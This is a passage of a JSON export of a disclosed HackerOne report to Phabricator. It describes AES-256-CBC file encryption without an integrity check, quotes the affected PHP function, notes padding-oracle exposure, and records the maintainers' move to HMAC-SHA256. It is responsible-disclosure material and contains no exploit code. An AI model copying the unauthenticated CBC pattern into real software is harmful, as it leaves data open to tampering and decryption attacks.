            "message": "Yeah, `PhabricatorHash::digest()` is still HMAC-SHA1. While working toward this I removed our remaining non-HMAC use of SHA1 (<https://secure.phabricator.com/D17619>) in favor of SHA-256 (<https://secure.phabricator.com/D17620>, etc.) but we still have a fair amount of HMAC SHA1.\n\nIt's maybe worth trying to introduce a new HMAC-SHA256 method here, but it's potentially somewhat involved. I also don't like our current handling of `security.hmac-key`, and introducing HMCA-SHA256 would potentially let us fix that.\n\nI'll file something upstream and try to take a better look at this soon. I don't think any of this stuff is going to turn into a security vulnerability for a while unless a dramatic vulnerability is discovered in HMAC SHA1 overnight, but it would be good to at least have a more specific plan in place for moving away from SHA1.", 
            "markdown_message": "<p>Yeah, <code>PhabricatorHash::digest()</code> is still HMAC-SHA1. While working toward this I removed our remaining non-HMAC use of SHA1 (<a title=\"https://secure.phabricator.com/D17619\" href=\"/redirect?signature=0982da3fe70991af0fa1d34448db3e363a472418&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FD17619\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/D17619</span><i class=\"icon-external-link\"></i></a>) in favor of SHA-256 (<a title=\"https://secure.phabricator.com/D17620\" href=\"/redirect?signature=a145ca3d17b26c05f7a98001a6b48676e9cb76c2&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FD17620\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/D17620</span><i class=\"icon-external-link\"></i></a>, etc.) but we still have a fair amount of HMAC SHA1.</p>\n\n<p>It&#39;s maybe worth trying to introduce a new HMAC-SHA256 method here, but it&#39;s potentially somewhat involved. I also don&#39;t like our current handling of <code>security.hmac-key</code>, and introducing HMCA-SHA256 would potentially let us fix that.</p>\n\n<p>I&#39;ll file something upstream and try to take a better look at this soon. I don&#39;t think any of this stuff is going to turn into a security vulnerability for a while unless a dramatic vulnerability is discovered in HMAC SHA1 overnight, but it would be good to at least have a more specific plan in place for moving away from SHA1.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1585759, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T20:16:10.722Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T20:16:10.722Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Great! In that case, everything looks good to me and I look forward to working with you again in the future.", 
            "markdown_message": "<p>Great! In that case, everything looks good to me and I look forward to working with you again in the future.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1585766, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T20:16:10.763Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T20:16:10.763Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1585767, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-06T23:27:19.856Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-06T23:27:19.856Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "As a followup, we switched to HMAC-SHA256 for integrity hashing, and have taken initial steps to move away from HMAC-SHA1 in other cases. For details, see:\n\n  - Replacing HMAC-SHA1: <https://secure.phabricator.com/T12509>\n  - Upgrade guidance for integrity hashing: <https://secure.phabricator.com/T12515>", 
            "markdown_message": "<p>As a followup, we switched to HMAC-SHA256 for integrity hashing, and have taken initial steps to move away from HMAC-SHA1 in other cases. For details, see:</p>\n\n<ul>\n<li>Replacing HMAC-SHA1: <a title=\"https://secure.phabricator.com/T12509\" href=\"/redirect?signature=d6b0e219dc583199b69ace45f1b5a48383328995&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT12509\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T12509</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Upgrade guidance for integrity hashing: <a title=\"https://secure.phabricator.com/T12515\" href=\"/redirect?signature=2b30fa6d5044ff9355955d52f2fdda3ba8991f67&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT12515\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T12515</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ul>\n", 
            "type": "Activities::Comment", 
            "id": 1588243, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-08T08:27:16.588Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-08T08:27:16.588Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Thank you for keeping me informed. Interestingly, as [siepkes](https://secure.phabricator.com/p/siepkes/) pointed out, SHA-512 will perform better on a 64-bit CPU.\n\n> Piece of info (you guys might already be aware of it) which might be of interest when implementing this; SHA512 is often faster then SHA256 on x64. See for example: https://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256\n\nOn a side note, if anyone reading this report is interested in learning more about the SHA-2 family, I wrote a piece in Laurens Van Houtven's fantastic book \"[Crypto 101](https://github.com/crypto101/book/blob/master/Crypto101.org#sha-2)\".", 
            "markdown_message": "<p>Thank you for keeping me informed. Interestingly, as <a href=\"/redirect?signature=5a2ac3428cd984a374ac06bede7fef57a23b43d0&amp;url=https%3A%2F%2Fsecure.phabricator.com%2Fp%2Fsiepkes%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>siepkes</span><i class=\"icon-external-link\"></i></a> pointed out, SHA-512 will perform better on a 64-bit CPU.</p>\n\n<blockquote>\n<p>Piece of info (you guys might already be aware of it) which might be of interest when implementing this; SHA512 is often faster then SHA256 on x64. See for example: <a title=\"https://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256\" href=\"/redirect?signature=7db496fc7d12c457bde615c9b148f2add9d652e8&amp;url=https%3A%2F%2Fcrypto.stackexchange.com%2Fquestions%2F26336%2Fsha512-faster-than-sha256\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256</span><i class=\"icon-external-link\"></i></a></p>\n</blockquote>\n\n<p>On a side note, if anyone reading this report is interested in learning more about the SHA-2 family, I wrote a piece in Laurens Van Houtven&#39;s fantastic book &quot;<a href=\"/redirect?signature=eb49042be133dbced13b6584e0fba8464d2f038a&amp;url=https%3A%2F%2Fgithub.com%2Fcrypto101%2Fbook%2Fblob%2Fmaster%2FCrypto101.org%23sha-2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Crypto 101</span><i class=\"icon-external-link\"></i></a>&quot;.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1590639, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "edoverflow", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/edoverflow", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/116/374/2e86e29173a7b27dc4e4c35ecaef804781110b9f_small.png?1527882436"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 39, 
        "name": "Missing Required Cryptographic Step"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -50124082.537302434, 
    "disclosed_at": "2017-04-05T20:16:10.747Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/216746", 
    "created_at": "2017-03-28T17:31:13.989Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Dear Phabricator bug bounty team,</p>\n\n<h1 id=\"summary\">Summary</h1>\n\n<hr>\n\n<p>Phabricator encrypts data with AES in CBC mode, but does not ensure integrity of the encrypted data. You must authenticate the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.</p>\n\n<h1 id=\"why-does-this-vulnerability-exist\">Why does this vulnerability exist?</h1>\n\n<hr>\n\n<p><code>src/applications/files/format/PhabricatorFileAES256StorageFormat.php</code> encrypts the data as follows without checking the integrity of the message:</p>\n<pre class=\"highlight plaintext\"><code>private function encryptData(\n    $data,\n    PhutilOpaqueEnvelope $key,\n    PhutilOpaqueEnvelope $iv) {\n    $method = &#39;aes-256-cbc&#39;;\n    $key = $key-&gt;openEnvelope();\n    $iv = $iv-&gt;openEnvelope();\n    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);\n    if ($result === false) {\n      throw new Exception(\n        pht(\n          &#39;Failed to openssl_encrypt() data: %s&#39;,\n          openssl_error_string()));\n    }\n    return $result;\n}\n</code></pre>\n<p>Link to source code: <a title=\"https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php\" href=\"/redirect?signature=9b31aa4c4f7f5e511e2d54874a6f77cc19a8f856&amp;url=https%3A%2F%2Fgithub.com%2Fphacility%2Fphabricator%2Fblob%2Fmaster%2Fsrc%2Fapplications%2Ffiles%2Fformat%2FPhabricatorFileAES256StorageFormat.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php</span><i class=\"icon-external-link\"></i></a></p>\n\n<h1 id=\"how-can-this-be-exploited\">How can this be exploited?</h1>\n\n<hr>\n\n<p>By not ensuring integrity Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.</p>\n\n<h1 id=\"how-can-this-be-fixed\">How can this be fixed?</h1>\n\n<hr>\n\n<p>As stated previously, you must check the integrity of the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.</p>\n\n<p>Best regards,<br>\nEd</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://phacility.com/phabricator/", 
            "about": "Phabricator is a collection of open source web applications that help software companies build better software.", 
            "twitter_handle": "phabricator", 
            "name": "Phabricator"
        }, 
        "handle": "phabricator", 
        "url": "https://hackerone.com/phabricator", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/018/8f0130b0439b00cdeeddd76246ec8063cac6495f_small.jpg?1487955532", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/018/29aa105aca62b26e62c64e57c902e5db2bb8daf6_medium.jpg?1487955532"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 18, 
        "default_currency": "usd"
    }, 
    "is_published": false
}